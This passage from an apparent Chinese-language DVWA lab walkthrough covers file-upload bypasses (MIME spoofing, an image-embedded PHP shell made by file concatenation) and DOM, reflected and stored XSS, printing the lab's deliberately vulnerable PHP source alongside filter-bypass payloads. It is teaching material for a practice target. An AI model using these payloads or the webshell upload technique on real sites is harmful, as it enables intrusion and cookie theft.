images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对文件上传的类型做了限制，要求必须是image/jpeg 或者 image/png 类型的。</p>
<h3 id="解决方法-9"><a href="#解决方法-9" class="headerlink" title="解决方法"></a>解决方法</h3><p>抓包更改mime类型</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669701739202-ece0a053-0cfe-44e8-a777-2a88747fe2b0.png" alt="img"></p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669701785923-a21b61b4-5591-4b0c-b7b2-e823f2bb657f.png" alt="img"></p>
<p>连接蚁剑即可</p>
<h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><h3 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>( <span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line"><span class="comment">// strtoLower把所有字符转换为小写</span></span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>(<span class="keyword">string</span> filename)</span><br><span class="line">函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</span><br><span class="line">可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”*.jpg”、”*.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。</span><br><span class="line">    <span class="keyword">if</span>( ( <span class="title function_ invoke__">strtoLower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || <span class="title function_ invoke__">strtoLower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || <span class="title function_ invoke__">strtoLower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        <span class="title function_ invoke__">getimagesize</span>( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> 这个就必须上传一个图片马了，他对文件的文件头，文件名形式等等都做了检查。</p>
<p>制作图片马</p>
<p>copy a.jpg/b+1.php hack.jpg</p>
<h3 id="解决方法-10"><a href="#解决方法-10" class="headerlink" title="解决方法"></a>解决方法</h3><p>上传图片马</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669704059168-f0a70d01-6b42-457e-86fc-65abf2cebe2f.png" alt="img"></p>
<h1 id="XSS-DOM-DOM型XSS"><a href="#XSS-DOM-DOM型XSS" class="headerlink" title="XSS(DOM) DOM型XSS"></a>XSS(DOM) DOM型XSS</h1><p>DOM型XSS攻击，不存在服务器端代码，所以没有与服务器端进行交互，只是在操作DO（文件对象），也就是HTML元素，攻击者可以构造js代码，闭合元素标签执行恶意的js代码</p>
<p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p>
<p>DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。</p>
<p>可能触发DOM型XSS的属性：</p>
<p>document.referer属性</p>
<p>window.name属性</p>
<p>location属性</p>
<p>innerHTML属性</p>
<p>documen.write属性</p>
<h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><h3 id="源码解析-9"><a href="#源码解析-9" class="headerlink" title="源码解析"></a>源码解析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//没有保护，什么都没有</span></span><br><span class="line"><span class="comment"># No protections, anything goes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-11"><a href="#解决方法-11" class="headerlink" title="解决方法"></a>解决方法</h3><p>什么保护都没有，直接进行弹窗尝试。</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669711781946-405f596f-33ed-4720-a6a7-09db0950e632.png" alt="img"></p>
<p>xss常用语句</p>
<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;

&lt;svg οnlοad=alert(document.cookie)&gt;
</code></pre>
<p>​    &lt;img src=1 οnerrοr=alert(1)&gt;</p>
<p>​    <a href="javascript:alert(1)"></a></p>
<h2 id="Mediun"><a href="#Mediun" class="headerlink" title="Mediun"></a>Mediun</h2><h3 id="源码分析-4"><a href="#源码分析-4" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="comment">// array_key_exists()检查键是否存在</span></span><br><span class="line"><span class="title function_ invoke__">array_key_exists</span>() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 <span class="literal">true</span>，如果键名不存在则返回 <span class="literal">false</span>。</span><br><span class="line">提示：如果指定数组的时候省略了键名，将会生成从 <span class="number">0</span> 开始并以 <span class="number">1</span> 递增的整数键名</span><br><span class="line"><span class="title function_ invoke__">array_key_exists</span>(key,<span class="keyword">array</span>)</span><br><span class="line">key 必需    规定键名。</span><br><span class="line"><span class="keyword">array</span>    必需。规定数组</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not alLow script tags</span></span><br><span class="line"><span class="comment">//过滤&lt;script，含scriipt的就不可以</span></span><br><span class="line"><span class="title function_ invoke__">stripos</span>() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</span><br><span class="line"><span class="title function_ invoke__">stripos</span>(<span class="keyword">string</span>,find,start)</span><br><span class="line"><span class="keyword">string</span> 必需    规定被搜索的字符串。</span><br><span class="line">find 必需    规定要查找的字符。</span><br><span class="line">start 可选    规定开始搜索的位置。</span><br><span class="line">返回值：    返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 <span class="literal">FALSE</span>。注释：字符串位置从 <span class="number">0</span> 开始，不是从 <span class="number">1</span> 开始。</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span> (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="comment">//如果参数不含&lt;script</span></span><br><span class="line"><span class="title function_ invoke__">header</span>() 函数向客户端发送原始的 HTTP 报头</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="keyword">string</span>,replace,http_response_code)</span><br><span class="line"><span class="keyword">string</span> 必需    规定要发送的报头字符串。</span><br><span class="line">replace 可选    指示该报头是否替换之前的报头，或添加第二个报头。</span><br><span class="line">默认是 <span class="literal">true</span>（替换）。<span class="literal">false</span>（允许相同类型的多个报头）。</span><br><span class="line">http_response_code可选    把 HTTP 响应代码强制为指定的值。（PHP <span class="number">4</span> 以及更高版本可用）</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-12"><a href="#解决方法-12" class="headerlink" title="解决方法"></a>解决方法</h3><p>简单来说，就是过滤掉了“&lt;script”，当函数匹配到 &lt;script 字符串的时候就会将URL后面的参数修正为 ?default=English</p>
<p>在这里可以通过onerror事件，在装载文档或图像的过程中如果发生了错误就会触发</p>
<p> 因为过滤了script标签 所以通过使用img标签 但是前提要把option和select标签闭合（这里的标签  是根据页面源码写的）</p>
<p><code>&lt;/option&gt;&lt;/select&gt;&lt;imgsrc=xonerror=alert(1)&gt;</code></p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669712016830-1111c8ce-9739-41aa-8e28-21d207fc0320.png" alt="img"></p>
<h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><h3 id="源码分析-5"><a href="#源码分析-5" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the alLowable languages</span></span><br><span class="line"><span class="comment">//白名单，只允许French、English、German、Spanish</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-13"><a href="#解决方法-13" class="headerlink" title="解决方法"></a>解决方法</h3><p>（1）这里设置了白名单，如果default的值不为”French”、”English”、”German”、”Spanish”的话就重置URL为:?default=English ，这里只是对 default 的变量进行了过滤。</p>
<p>（2）可以考虑在English后面使用&amp;或者#</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">English&amp;&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">English<span class="comment">#&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="XSS-Reflected-反射型XSS"><a href="#XSS-Reflected-反射型XSS" class="headerlink" title="XSS(Reflected) 反射型XSS"></a>XSS(Reflected) 反射型XSS</h1><p>XSS攻击需要具备两个条件：</p>
<ul>
<li>需要向web页面注入恶意代码；</li>
<li>这些恶意代码能够被浏览器成功的执行</li>
</ul>
<p>XSS反射型漏洞</p>
<p>反射型XSS，顾名思义在于“反射”这个一来一回的过程。反射型XSS的触发有后端的参与，而之所以触发XSS是因为后端解析用户在前端输入的带有XSS性质的脚本或者脚本的data URI编码，后端解析用户输入处理后返回给前端，由浏览器解析这段XSS脚本，触发XSS漏洞。因此如果要避免反射性XSS，则必须需要后端的协调，在后端解析前端的数据时首先做相关的字串检测和转义处理；同时前端同样也许针对用户的数据做excape转义，保证数据源的可靠性</p>
<p>基本原理就是通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特定的代码参数会被HTML解析，执行，如此就可以获取用户的COOIKE，进而盗号登陆。</p>
<p>特点是：非持久化 必须用户点击带有特定参数的链接才能引起。<br>XSS反射型攻击，恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的。</p>
<h2 id="LOW-2"><a href="#LOW-2" class="headerlink" title="LOW"></a>LOW</h2><h3 id="源码分析-6"><a href="#源码分析-6" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="comment">// arrary_key_exists()函数：判断$_GET的值中是否存在“name”键名。并且$_GET[‘name’]的值是否不为空，满足这些条件，直接输出下面的输出语句。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-14"><a href="#解决方法-14" class="headerlink" title="解决方法"></a>解决方法</h3><p> 服务器只是判断了 name 参数是否为空，如果不为空的话就直接打印出来。服务器并没有对 name 参数做任何的过滤和检查。</p>
<p>payload</p>
 <script>alert(1)</script>

<h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码分析-7"><a href="#源码分析-7" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line"><span class="comment">//将输入中的&lt;script&gt;转化为空</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-15"><a href="#解决方法-15" class="headerlink" title="解决方法"></a>解决方法</h3><p>会检查 name 参数中是否有 “&lt; script &gt;”，如果有则替换为空，也就是说过滤掉了“<script>”这个标签。还有在这里使用了str_replace函数，它是区分大小写的，因此可以使用大小写绕过。</p>
<p><code>&lt;sCript&gt;alert(1)&lt;/ScRipt&gt;</code></p>
<p>除了使用大小写绕过，还可以使用双写绕过</p>
<p><code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code></p>
<h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><h3 id="源码分析-8"><a href="#源码分析-8" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line"><span class="comment">//使用通配符，完全匹配script*N，所以有关script的标签全被过滤</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-16"><a href="#解决方法-16" class="headerlink" title="解决方法"></a>解决方法</h3><p>preg_replace() 函数执行一个正则表达式的搜索和替换，“*” 代表一个或多个任意字符，“i” 代表不区分大小写。也就是说 “&lt; script &gt;” 标签在这里被完全过滤了，但是我们可以通过其他的标签例如 img、body 等标签的事件或者iframe 等标签的 src 注入 JS 攻击脚本。</p>
<img src = 1 onerror = alert(1)>

<h1 id="XSS-Stored-存储型XSS"><a href="#XSS-Stored-存储型XSS" class="headerlink" title="XSS(Stored) 存储型XSS"></a>XSS(Stored) 存储型XSS</h1><p>XSS存储型攻击，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。因为存储型XSS的代码存在于网页的代码中，可以说是永久型的。</p>
<p>存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
<h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><h3 id="源码分析-9"><a href="#源码分析-9" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line"><span class="comment">// trim(string,charlist)</span></span><br><span class="line">函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="comment">// stripslashes(string)</span></span><br><span class="line">函数删除字符串中的反斜杠。</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line"><span class="comment">// mysql_real_escape_string(string,connection)</span></span><br><span class="line">函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-17"><a href="#解决方法-17" class="headerlink" title="解决方法"></a>解决方法</h3><p>NAME处进行了长度限制，所以我们在Message处使用 <script>alert(1)</script> 进行尝试</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669717831759-3402abfc-b841-4dce-9c5c-8d66bb5ba99e.png" alt="img"></p>
<p>再次访问此页面时，就会有次弹窗</p>
<p>成功后更新数据库</p>
<p>源码中出现的函数：</p>
<h5 id="1）trim-函数"><a href="#1）trim-函数" class="headerlink" title="1）trim()函数"></a>1）trim()函数</h5><p>语法：</p>
<p>trim(string,charlist)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>string</td>
<td>必需。规定要检查的字符串。</td>
</tr>
<tr>
<td>charlist</td>
<td>可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符：”\0” - NULL”\t” - 制表符”\n” - 换行”\x0B” - 垂直制表符”\r” - 回车” “ - 空格</td>
</tr>
</tbody></table>
<h5 id="2）stripslashes-函数"><a href="#2）stripslashes-函数" class="headerlink" title="2）stripslashes()函数"></a>2）stripslashes()函数</h5><p>语法：</p>
<p>stripslashes(string)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>string</td>
<td>必需。规定要检查的字符串。</td>
</tr>
</tbody></table>
<p>用于删除反斜杠，可用于清理从数据库中或者从 HTML 表单中取回的数据。</p>
<h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码分析-10"><a href="#源码分析-10" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="comment">// strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用&lt;b&gt;标签</span></span><br><span class="line"><span class="comment">// addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span 